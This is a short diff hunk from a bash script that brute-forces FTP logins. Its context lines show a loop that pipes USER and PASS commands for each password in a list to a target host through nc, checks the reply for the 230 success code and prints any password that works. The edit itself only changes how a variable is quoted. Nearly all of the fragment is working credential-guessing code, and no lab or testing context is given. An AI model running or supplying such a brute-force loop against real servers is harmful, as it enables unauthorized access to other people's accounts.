@@ -14,7 +14,7 @@ while read -r PASSWORD; do
   res=$(echo -e "USER ${USERNAME}\r\nPASS ${PASSWORD}\r\nQUIT" | nc $IP $PORT)
 
   # Check the FTP server response for successful authentication
-  if echo "$res" | grep -q "230"; then
+  if echo "${res}" | grep -q "230"; then
     echo "Password found: ${PASSWORD}"
     exit 0  # Exit the script if a valid password is found
   fi
